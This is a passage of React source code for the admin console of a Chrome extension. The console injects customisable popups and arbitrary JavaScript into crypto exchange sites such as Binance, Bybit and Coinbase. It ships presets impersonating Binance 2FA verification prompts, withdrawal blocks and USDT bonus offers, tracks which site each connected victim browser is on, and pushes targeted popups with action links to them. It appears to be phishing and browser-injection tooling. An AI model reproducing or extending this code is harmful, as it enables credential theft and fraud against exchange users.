                      color: isSelected ? 'var(--brand-purple)' : 'var(--text-primary)',
                      transition: 'all 0.15s ease',
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: '8px',
                    }}
                  >
                    <span>{rule.domain}</span>
                    <span
                      style={{
                        fontSize: '9px',
                        padding: '2px 6px',
                        borderRadius: '10px',
                        background: rule.enabled ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
                        color: rule.enabled ? 'var(--brand-green)' : 'var(--brand-red)',
                      }}
                    >
                      {rule.enabled ? 'ON' : 'OFF'}
                    </span>
                  </button>
                );
              })}
            </div>

            {/* Clear, Dedicated "Add Domain Rule" Trigger Button */}
            <button
              type="button"
              className="btn btn-primary btn-sm"
              onClick={handleOpenAddDomainModal}
            >
              ➕ Add New Domain Rule
            </button>
          </div>

          {/* 2 OPTIONS SELECTOR: Elementor vs Custom Coding */}
          <div className="builder-mode-switcher">
            <button
              type="button"
              className={`builder-mode-btn ${currentMode === 'elementor' ? 'active' : ''}`}
              onClick={() => setBuilderMode('elementor')}
            >
              <span className="mode-icon">🎨</span>
              <div>
                <div className="mode-title">Elementor (Visual Section Builder)</div>
                <div className="mode-desc">Non-technical friendly: Add headings, texts, buttons & alert badges as modular sections</div>
              </div>
              {currentMode === 'elementor' && <span className="mode-check">✓ Active Mode</span>}
            </button>

            <button
              type="button"
              className={`builder-mode-btn ${currentMode === 'code' ? 'active' : ''}`}
              onClick={() => setBuilderMode('code')}
            >
              <span className="mode-icon">💻</span>
              <div>
                <div className="mode-title">Custom Coding (HTML / CSS / JS)</div>
                <div className="mode-desc">Developer friendly: Write raw HTML structure, custom CSS styling & JavaScript logic</div>
              </div>
              {currentMode === 'code' && <span className="mode-check">✓ Active Mode</span>}
            </button>
          </div>

          {/* Main 2-Column Split: Controls on Left, Live Canvas on Right */}
          <div className="elementor-layout-split">
            {/* Left Column: Form Controls */}
            <div className="elementor-sidebar">
              {/* Domain & Global Frame Settings */}
              <div className="builder-box">
                <div className="builder-box-title">
                  <span>🌐 Domain & Popup Frame</span>
                  <label className="toggle-switch" title="Enable/Disable overlay">
                    <input
                      type="checkbox"
                      checked={formData.enabled}
                      onChange={(e) => setFormData({ ...formData, enabled: e.target.checked })}
                    />
                    <span className="toggle-slider"></span>
                  </label>
                </div>

                <div className="form-group">
                  <label className="form-label">Match Domain Pattern:</label>
                  <input
                    type="text"
                    className="form-input"
                    value={formData.domain}
                    onChange={(e) => setFormData({ ...formData, domain: e.target.value })}
                    placeholder="e.g. binance.com or *.binance.com"
                  />
                </div>

                {/* 4 Clean Position Cards */}
                <div className="form-group">
                  <label className="form-label">Popup Screen Position:</label>
                  <div className="position-grid-4">
                    {[
                      { id: 'top', label: 'Top Banner', icon: '⬆' },
                      { id: 'center', label: 'Center Modal', icon: '🗖' },
                      { id: 'bottom', label: 'Bottom Banner', icon: '⬇' },
                      { id: 'bottom-right', label: 'Corner Toast', icon: '↘' },
                    ].map((p) => (
                      <button
                        key={p.id}
                        type="button"
                        className={`position-card-btn ${formData.overlay?.position === p.id ? 'active' : ''}`}
                        onClick={() => updateOverlay('position', p.id)}
                      >
                        <span>{p.icon}</span>
                        <span>{p.label}</span>
                      </button>
                    ))}
                  </div>
                </div>

                {/* Height Slider */}
                <div className="form-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <label className="form-label">Popup Height:</label>
                    <span style={{ fontSize: '12px', fontWeight: 700, color: 'var(--brand-purple)' }}>
                      {formData.overlay?.height || 50}vh
                    </span>
                  </div>
                  <input
                    type="range"
                    min="20"
                    max="90"
                    value={formData.overlay?.height || 50}
                    onChange={(e) => updateOverlay('height', e.target.value)}
                    className="clean-slider"
                  />
                </div>

                {/* Colors */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-label">Background:</label>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <input
                        type="color"
                        value={formData.overlay?.bg || '#14171d'}
                        onChange={(e) => updateOverlay('bg', e.target.value)}
                        style={{ width: '32px', height: '32px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                      />
                      <span style={{ fontSize: '11px', fontFamily: 'monospace' }}>{formData.overlay?.bg || '#14171d'}</span>
                    </div>
                  </div>

                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-label">Accent / Border:</label>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <input
                        type="color"
                        value={formData.overlay?.borderColor || '#f0b90b'}
                        onChange={(e) => updateOverlay('borderColor', e.target.value)}
                        style={{ width: '32px', height: '32px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                      />
                      <span style={{ fontSize: '11px', fontFamily: 'monospace' }}>{formData.overlay?.borderColor || '#f0b90b'}</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* MODE A: ELEMENTOR SECTIONS BUILDER */}
              {currentMode === 'elementor' ? (
                <div className="builder-box">
                  <div className="builder-box-title">
                    <span>🧱 Elementor Sections</span>
                    <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                      {currentSections.length} {currentSections.length === 1 ? 'section' : 'sections'}
                    </span>
                  </div>

                  {/* List of Sections */}
                  {currentSections.length === 0 ? (
                    <div style={{ padding: '20px', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '13px' }}>
                      No sections added yet. Click below to add your first section!
                    </div>
                  ) : (
                    currentSections.map((sec, idx) => (
                      <div key={sec.id || idx} className="section-item-card">
                        <div className="section-item-header">
                          <div className="section-badge-title">
                            <span>
                              {sec.type === 'heading' && '📌'}
                              {sec.type === 'text' && '📝'}
                              {sec.type === 'button' && '🔘'}
                              {sec.type === 'alert' && '⚠️'}
                              {sec.type === 'countdown' && '⏳'}
                              {sec.type === 'image' && '🖼️'}
                            </span>
                            <span>{sec.type.toUpperCase()} SECTION</span>
                          </div>

                          <div className="section-controls">
                            <button
                              type="button"
                              className="btn-icon-subtle"
                              onClick={() => handleMoveSection(idx, -1)}
                              disabled={idx === 0}
                              title="Move Up"
                            >
                              ▲
                            </button>
                            <button
                              type="button"
                              className="btn-icon-subtle"
                              onClick={() => handleMoveSection(idx, 1)}
                              disabled={idx === currentSections.length - 1}
                              title="Move Down"
                            >
                              ▼
                            </button>
                            <button
                              type="button"
                              className="btn-icon-subtle delete"
                              onClick={() => handleRemoveSection(idx)}
                              title="Delete Section"
                            >
                              ✕
                            </button>
                          </div>
                        </div>

                        {/* Inline Fields for each section type */}
                        <div className="section-item-body">
                          {sec.type === 'heading' && (
                            <div>
                              <div className="form-group">
                                <label className="form-label">Heading Text:</label>
                                <input
                                  type="text"
                                  className="form-input"
                                  value={sec.text || ''}
                                  onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                  placeholder="e.g. Account Security Alert"
                                />
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Font Size (px):</label>
                                  <input
                                    type="number"
                                    className="form-input"
                                    value={sec.size || 32}
                                    onChange={(e) => handleUpdateSection(idx, 'size', parseInt(e.target.value, 10))}
                                  />
                                </div>
                                <div>
                                  <label className="form-label">Text Color:</label>
                                  <input
                                    type="color"
                                    value={sec.color || '#f0b90b'}
                                    onChange={(e) => handleUpdateSection(idx, 'color', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'text' && (
                            <div>
                              <div className="form-group">
                                <label className="form-label">Message Text / HTML:</label>
                                <textarea
                                  className="form-textarea"
                                  rows={2}
                                  value={sec.text || ''}
                                  onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                  placeholder="Enter instructions, warning details or message..."
                                />
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Size (px):</label>
                                  <input
                                    type="number"
                                    className="form-input"
                                    value={sec.size || 16}
                                    onChange={(e) => handleUpdateSection(idx, 'size', parseInt(e.target.value, 10))}
                                  />
                                </div>
                                <div>
                                  <label className="form-label">Text Color:</label>
                                  <input
                                    type="color"
                                    value={sec.color || '#eaecef'}
                                    onChange={(e) => handleUpdateSection(idx, 'color', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'button' && (
                            <div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div className="form-group">
                                  <label className="form-label">Button Label:</label>
                                  <input
                                    type="text"
                                    className="form-input"
                                    value={sec.text || ''}
                                    onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                    placeholder="e.g. Verify Now →"
                                  />
                                </div>
                                <div className="form-group">
                                  <label className="form-label">Link URL:</label>
                                  <input
                                    type="text"
                                    className="form-input"
                                    value={sec.url || ''}
                                    onChange={(e) => handleUpdateSection(idx, 'url', e.target.value)}
                                    placeholder="https://..."
                                  />
                                </div>
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Button Color:</label>
                                  <input
                                    type="color"
                                    value={sec.bg || '#f0b90b'}
                                    onChange={(e) => handleUpdateSection(idx, 'bg', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                                <div>
                                  <label className="form-label">Text Color:</label>
                                  <input
                                    type="color"
                                    value={sec.color || '#000000'}
                                    onChange={(e) => handleUpdateSection(idx, 'color', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'alert' && (
                            <div>
                              <div className="form-group">
                                <label className="form-label">Alert Message:</label>
                                <input
                                  type="text"
                                  className="form-input"
                                  value={sec.text || ''}
                                  onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                  placeholder="e.g. Action required within 24 hours"
                                />
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Alert Style:</label>
                                  <select
                                    className="form-select"
                                    value={sec.variant || 'warning'}
                                    onChange={(e) => handleUpdateSection(idx, 'variant', e.target.value)}
                                  >
                                    <option value="warning">⚠️ Warning Gold</option>
                                    <option value="danger">🚨 Danger Red</option>
                                    <option value="success">🟢 Success Green</option>
                                    <option value="info">🔵 Info Blue</option>
                                  </select>
                                </div>
                                <div>
                                  <label className="form-label">Icon:</label>
                                  <input
                                    type="text"
                                    className="form-input"
                                    value={sec.icon || '⚠️'}
                                    onChange={(e) => handleUpdateSection(idx, 'icon', e.target.value)}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'countdown' && (
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                              <div className="form-group">
                                <label className="form-label">Countdown Label:</label>
                                <input
                                  type="text"
                                  className="form-input"
                                  value={sec.label || 'Expires in:'}
                                  onChange={(e) => handleUpdateSection(idx, 'label', e.target.value)}
                                />
                              </div>
                              <div className="form-group">
                                <label className="form-label">Minutes:</label>
                                <input
                                  type="number"
                                  className="form-input"
                                  value={sec.minutes || 15}
                                  onChange={(e) => handleUpdateSection(idx, 'minutes', parseInt(e.target.value, 10))}
                                />
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    ))
                  )}

                  {/* Add Section Trigger Button */}
                  <button
                    type="button"
                    className="btn-add-section"
                    onClick={() => setShowAddSectionTray(!showAddSectionTray)}
                  >
                    <span>➕ Add Section (Like Elementor)</span>
                  </button>

                  {/* Add Section Tray */}
                  {showAddSectionTray && (
                    <div className="add-section-grid">
                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('heading')}
                      >
                        <span className="add-section-icon">📌</span>
                        <span className="add-section-label">Heading</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('text')}
                      >
                        <span className="add-section-icon">📝</span>
                        <span className="add-section-label">Text Block</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('button')}
                      >
                        <span className="add-section-icon">🔘</span>
                        <span className="add-section-label">Action Button</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('alert')}
                      >
                        <span className="add-section-icon">⚠️</span>
                        <span className="add-section-label">Alert Badge</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('countdown')}
                      >
                        <span className="add-section-icon">⏳</span>
                        <span className="add-section-label">Countdown</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('image')}
                      >
                        <span className="add-section-icon">🖼️</span>
                        <span className="add-section-label">Image</span>
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                /* MODE B: CUSTOM CODING (HTML / CSS / JS) */
                <div className="builder-box">
                  <div className="builder-box-title">
                    <span>💻 Custom Code Editor</span>
                    <div style={{ display: 'flex', gap: '4px' }}>
                      <button
                        type="button"
                        className={`btn btn-sm ${codeActiveTab === 'html' ? 'btn-primary' : 'btn-secondary'}`}
                        onClick={() => setCodeActiveTab('html')}
                      >
                        HTML
                      </button>
                      <button
                        type="button"
                        className={`btn btn-sm ${codeActiveTab === 'css' ? 'btn-primary' : 'btn-secondary'}`}
                        onClick={() => setCodeActiveTab('css')}
                      >
                        CSS
                      </button>
                      <button
                        type="button"
                        className={`btn btn-sm ${codeActiveTab === 'js' ? 'btn-primary' : 'btn-secondary'}`}
                        onClick={() => setCodeActiveTab('js')}
                      >
                        JavaScript
                      </button>
                    </div>
                  </div>

                  {codeActiveTab === 'html' && (
                    <div>
                      <label className="form-label">Custom HTML Markup:</label>
                      <textarea
                        className="form-textarea code-textarea"
                        rows={10}
                        value={formData.overlay?.customHtml || ''}
                        onChange={(e) => updateOverlay('customHtml', e.target.value)}
                        placeholder="<div>Your custom HTML markup...</div>"
                      />
                    </div>
                  )}

                  {codeActiveTab === 'css' && (
                    <div>
                      <label className="form-label">Custom CSS Styles (Injected into Page):</label>
                      <textarea
                        className="form-textarea code-textarea"
                        rows={10}
                        value={formData.overlay?.customCss || ''}
                        onChange={(e) => updateOverlay('customCss', e.target.value)}
                        placeholder="#custom-sticky-popup { animation: fadeIn 0.3s ease; }"
                      />
                    </div>
                  )}

                  {codeActiveTab === 'js' && (
                    <div>
                      <label className="form-label">Custom JavaScript (Executed on Domain):</label>
                      <textarea
                        className="form-textarea code-textarea"
                        rows={10}
                        value={formData.overlay?.customJs || ''}
                        onChange={(e) => updateOverlay('customJs', e.target.value)}
                        placeholder="// e.g. setTimeout(() => window.location.href = '...', 5000);"
                      />
                    </div>
                  )}
                </div>
              )}

              {/* Publish / Save Button */}
              <button
                type="button"
                className="btn btn-primary"
                onClick={handleSaveRule}
                disabled={saving}
                style={{ width: '100%', padding: '14px', fontSize: '14px', fontWeight: 700 }}
              >
                {saving ? '⏳ Saving & Publishing...' : '💾 Save & Publish Configuration'}
              </button>

              {selectedRuleId && (
                <button
                  type="button"
                  className="btn btn-danger btn-sm"
                  onClick={() => handleDeleteRule(selectedRuleId)}
                  style={{ width: '100%' }}
                >
                  🗑 Delete This Domain Rule
                </button>
              )}
            </div>

            {/* Right Column: Live Interactive Preview Canvas */}
            <div>
              {renderLiveCanvas(false)}
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: Fullscreen Preview */}
      {activeTab === 'preview' && (
        <div className="card">
          <div className="card-header">
            <div>
              <h2 className="card-title">Fullscreen Live Interactive Preview</h2>
              <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                Simulating how the overlay renders in Chrome on <strong>{formData.domain}</strong> in real time.
              </p>
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <button className="btn btn-secondary btn-sm" onClick={() => setActiveTab('rules')}>
                ← Back to Visual Builder
              </button>
              <button className="btn btn-primary btn-sm" onClick={handleSaveRule} disabled={saving}>
                {saving ? '⏳ Saving...' : '💾 Save & Publish'}
              </button>
            </div>
          </div>

          {renderLiveCanvas(true)}
        </div>
      )}

      {/* TAB 3: Connected Clients & Instant Alert (Replaced targeted push with intuitive direct alert) */}
      {activeTab === 'clients' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '22px' }}>
          {/* Top Info Banner & Broadcast Button */}
          <div className="card">
            <div className="card-header" style={{ marginBottom: '12px' }}>
              <div>
                <h2 className="card-title">👥 Connected Browser Extension Clients</h2>
                <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                  Click <strong>&quot;Send Alert&quot;</strong> on any client to immediately pop up a custom warning, pause, or reward on their screen in real time.
                </p>
              </div>
              <div style={{ display: 'flex', gap: '10px' }}>
                <button
                  className="btn btn-primary btn-sm"
                  onClick={() => handleOpenAlertModalForClient(null)}
                >
                  📢 Broadcast Alert to All Clients
                </button>
                <button className="btn btn-secondary btn-sm" onClick={fetchClientsAndStats}>
                  🔄 Refresh
                </button>
              </div>
            </div>

            {/* Clients Table with Direct Send Alert Button */}
            <div className="table-wrapper">
              <table className="data-table">
                <thead>
                  <tr>
                    <th>Status</th>
                    <th>Client ID</th>
                    <th>Current Domain</th>
                    <th>Last Heartbeat</th>
                    <th style={{ textAlign: 'right' }}>Direct Action</th>
                  </tr>
                </thead>
                <tbody>
                  {clients.length === 0 ? (
                    <tr>
                      <td colSpan={5} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
                        No browser extension clients connected yet. Install the unpacked extension in Chrome to see live clients here.
                      </td>
                    </tr>
                  ) : (
                    clients.map((c) => (
                      <tr key={c.clientId}>
                        <td>
                          <span className={`badge ${c.isOnline ? 'badge-green' : 'badge-gold'}`}>
                            {c.isOnline ? '● Online' : '○ Idle'}
                          </span>
                        </td>
                        <td>
                          <strong style={{ fontFamily: 'var(--font-mono)', fontSize: '12px' }}>{c.clientId}</strong>
                        </td>
                        <td>
                          <span style={{ fontWeight: 600, color: 'var(--brand-purple)' }}>{c.domain || 'unknown'}</span>
                        </td>
                        <td style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
                          {c.lastSeen ? new Date(c.lastSeen).toLocaleTimeString() : '—'}
                        </td>
                        <td style={{ textAlign: 'right' }}>
                          <button
                            type="button"
                            className="client-alert-btn"
                            onClick={() => handleOpenAlertModalForClient(c)}
                            title={`Send direct live popup alert to ${c.clientId}`}
                          >
                            <span>🔔</span>
                            <span>Send Alert</span>
                          </button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>

          {/* Active Dispatched Alerts Monitor */}
          <div className="card">
            <div className="card-header">
              <div>
                <h3 className="card-title">🚀 Currently Dispatched Alerts</h3>
                <p style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
                  These alerts are actively showing on connected client screens. Click <strong>&quot;Cancel Alert&quot;</strong> to dismiss them immediately.
                </p>
              </div>
            </div>

            {messages.length === 0 ? (
              <div style={{ padding: '24px', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '13px' }}>
                No active dispatched alerts. Click &quot;Send Alert&quot; on any client above to test direct delivery.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {messages.map((m) => (
                  <div
                    key={m.id}
                    style={{
                      padding: '16px 20px',
                      background: 'var(--bg-elevated)',
                      border: '1px solid var(--border-subtle)',
                      borderRadius: 'var(--radius-md)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      gap: '16px',
                    }}
                  >
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '6px' }}>
                        <span
                          style={{
                            fontWeight: 700,
                            fontSize: '14px',
                            color: m.colorTitle || 'var(--brand-gold)',
                          }}
                        >
                          {m.title}
                        </span>
                        {m.targetClientId ? (
                          <span className="badge badge-blue">Target: {m.targetClientId}</span>
                        ) : (
                          <span className="badge badge-gold">Broadcast (All)</span>
                        )}
                        <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
                          {new Date(m.createdAt).toLocaleTimeString()}
                        </span>
                      </div>
                      <div
                        style={{ fontSize: '13px', color: 'var(--text-secondary)' }}
                        dangerouslySetInnerHTML={{ __html: m.body }}
                      />
                    </div>

                    <button
                      type="button"
                      className="btn btn-danger btn-sm"
                      onClick={() => handleDeleteAlertMessage(m.id)}
                    >
                      ✕ Cancel Alert
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 4: Documentation & Setup Guide */}
      {activeTab === 'docs' && (
        <div className="card">
          <div className="card-header">
            <h2 className="card-title">Chrome Extension & Next.js Setup Guide</h2>
          </div>

          <div style={{ fontSize: '14px', lineHeight: '1.7', color: 'var(--text-primary)' }}>
            <h3 style={{ color: 'var(--brand-purple)', marginBottom: '8px' }}>1. How to Load the Extension in Google Chrome</h3>
            <ol style={{ paddingLeft: '20px', marginBottom: '20px', color: 'var(--text-secondary)' }}>
              <li>Open Google Chrome and navigate to <code>chrome://extensions</code>.</li>
              <li>Toggle <strong>Developer mode</strong> ON (top right corner).</li>
              <li>Click <strong>Load unpacked</strong>.</li>
              <li>Select your extension folder: <code>d:\binance_modify\extension</code>.</li>
              <li>Browse to <code>binance.com</code> — your dynamic overlay will inject immediately!</li>
            </ol>

            <h3 style={{ color: 'var(--brand-purple)', marginBottom: '8px' }}>2. Direct Client Alerts</h3>
            <p style={{ color: 'var(--text-secondary)', marginBottom: '14px' }}>
              In the <strong>Connected Clients</strong> tab, every user currently visiting your target domains appears with their unique Client ID. Click <strong>&quot;Send Alert&quot;</strong> to immediately display a tailored popup alert on their browser with zero delay.
            </p>
          </div>
        </div>
      )}

      {/* ==========================================================================
          MODAL 1: ADD NEW DOMAIN RULE (Clean, Simple, Not Confusing)
          ========================================================================== */}
      {showAddDomainModal && (
        <div className="modal-backdrop" onClick={() => setShowAddDomainModal(false)}>
          <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <div className="modal-title">
                <span>➕</span>
                <span>Add Target Website Domain</span>
              </div>
              <button
                type="button"
                className="modal-close-btn"
                onClick={() => setShowAddDomainModal(false)}
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleCreateNewDomainRule}>
              <div className="modal-body">
                <div>
                  <label className="form-label">Domain Name (Website where popup should appear):</label>
                  <input
                    type="text"
                    className="form-input"
                    value={newDomainInput}
                    onChange={(e) => setNewDomainInput(e.target.value)}
                    placeholder="e.g. bybit.com, binance.com, okx.com or *"
                    autoFocus
                    required
                  />

                  {/* 1-Click Popular Domain Suggestions */}
                  <div style={{ marginTop: '8px' }}>
                    <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Suggestions:</span>
                    <div className="quick-chips-row">
                      {['binance.com', 'bybit.com', 'coinbase.com', 'okx.com', 'kraken.com', '*'].map((d) => (
                        <button
                          key={d}
                          type="button"
                          className="quick-chip"
                          onClick={() => setNewDomainInput(d)}
                        >
                          {d === '*' ? '★ All Websites (*)' : d}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Initial Template Choice */}
                <div>
                  <label className="form-label">Select Initial Popup Template:</label>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                    {[
                      { id: 'binance', title: '🟡 Security Notice', desc: 'Binance 2FA verification prompt' },
                      { id: 'withdrawal', title: '🔴 Withdrawal Block', desc: 'Urgent paused withdrawal alert' },
                      { id: 'bonus', title: '🟢 500 USDT Voucher', desc: 'Trading rebate reward card' },
                      { id: 'blank', title: '⚪ Blank Popup', desc: 'Empty canvas to build custom' },
                    ].map((tpl) => (
                      <div
                        key={tpl.id}
                        onClick={() => setNewDomainTemplate(tpl.id)}
                        style={{
                          padding: '12px',
                          borderRadius: '8px',
                          border: `2px solid ${newDomainTemplate === tpl.id ? 'var(--brand-purple)' : 'var(--border-subtle)'}`,
                          background: newDomainTemplate === tpl.id ? 'var(--brand-purple-subtle)' : '#ffffff',
                          cursor: 'pointer',
                          transition: 'all 0.15s ease',
                        }}
                      >
                        <div style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>{tpl.title}</div>
                        <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px' }}>{tpl.desc}</div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              <div className="modal-footer">
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={() => setShowAddDomainModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="btn btn-primary"
                  disabled={saving}
                >
                  {saving ? '⏳ Creating...' : '🚀 Create Domain Rule'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ==========================================================================
          MODAL 2: SEND DIRECT ALERT TO CLIENT (With LIVE UI DESIGN PREVIEW)
          ========================================================================== */}
      {showAlertModal && (
        <div className="modal-backdrop" onClick={() => setShowAlertModal(false)}>
          <div className="modal-dialog" style={{ maxWidth: '680px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <div>
                <div className="modal-title">
                  <span>🔔</span>
                  <span>
                    {alertTargetClient
                      ? `Send Direct Alert to ${alertTargetClient.clientId}`
                      : 'Broadcast Alert to All Connected Clients'}
                  </span>
                </div>
                {alertTargetClient && (
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px' }}>
                    Currently browsing: <strong>{alertTargetClient.domain || 'unknown website'}</strong>
                  </div>
                )}
              </div>
              <button
                type="button"
                className="modal-close-btn"
                onClick={() => setShowAlertModal(false)}
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleSendDirectAlert}>
              <div className="modal-body">
                {/* 1-Click Alert Presets */}
                <div>
                  <label className="form-label">1-Click Alert Presets:</label>
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '6px' }}>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('withdrawal')}
                    >
                      🚨 Withdrawal Block
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('verification')}
                    >
                      ⚠️ 2FA Verify
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('reward')}
                    >
                      🎁 500 USDT Bonus
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('session')}
                    >
                      ⏳ Timeout
                    </button>
                  </div>
                </div>

                {/* Form Fields: Title & Message */}
                <div className="form-group" style={{ marginBottom: '8px' }}>
                  <label className="form-label">Alert Title:</label>
                  <input
                    type="text"
                    className="form-input"
                    value={alertForm.title}
                    onChange={(e) => setAlertForm({ ...alertForm, title: e.target.value })}
                    required
                  />
                </div>

                <div className="form-group" style={{ marginBottom: '8px' }}>
                  <label className="form-label">Alert Message Details:</label>
                  <textarea
                    className="form-textarea"
                    rows={2}
                    value={alertForm.body}
                    onChange={(e) => setAlertForm({ ...alertForm, body: e.target.value })}
                    required
                  />
                </div>

                {/* Button & Link */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginBottom: '8px' }}>
                  <div>
                    <label className="form-label">Button Label:</label>
                    <input
                      type="text"
                      className="form-input"
                      value={alertForm.ctaText}
                      onChange={(e) => setAlertForm({ ...alertForm, ctaText: e.target.value })}
                    />
                  </div>
                  <div>
                    <label className="form-label">Action Link URL:</label>
                    <input
                      type="text"
                      className="form-input"
                      value={alertForm.ctaUrl}
                      onChange={(e) => setAlertForm({ ...alertForm, ctaUrl: e.target.value })}
                    />
                  </div>
                </div>

                {/* Color Variant & Position */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginBottom: '8px' }}>
                  <div>
                    <label className="form-label">Color Style:</label>
                    <div style={{ display: 'flex', gap: '6px' }}>
                      {[
                        { id: 'danger', label: '🔴 Red', color: '#ef4444' },
                        { id: 'warning', label: '🟡 Gold', color: '#f0b90b' },
                        { id: 'success', label: '🟢 Green', color: '#10b981' },
                        { id: 'info', label: '🔵 Blue', color: '#3b82f6' },
                      ].map((v) => (
                        <button
                          key={v.id}
                          type="button"
                          className="quick-chip"
                          style={{
                            flex: 1,
                            textAlign: 'center',
                            borderWidth: alertForm.variant === v.id ? '2px' : '1px',
                            borderColor: alertForm.variant === v.id ? v.color : 'var(--border-light)',
                            fontWeight: alertForm.variant === v.id ? 700 : 500,
                          }}
                          onClick={() => setAlertForm({ ...alertForm, variant: v.id })}
                        >
                          {v.label}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div>
                    <label className="form-label">Placement:</label>
                    <div style={{ display: 'flex', gap: '6px' }}>
                      <button
                        type="button"
                        className="quick-chip"
                        style={{
                          flex: 1,
                          textAlign: 'center',
                          borderWidth: alertForm.position === 'center' ? '2px' : '1px',
                          borderColor: alertForm.position === 'center' ? 'var(--brand-purple)' : 'var(--border-light)',
                        }}
                        onClick={() => setAlertForm({ ...alertForm, position: 'center' })}
                      >
                        🗖 Center Modal
                      </button>
                      <button
                        type="button"
                        className="quick-chip"
                        style={{
                          flex: 1,
                          textAlign: 'center',
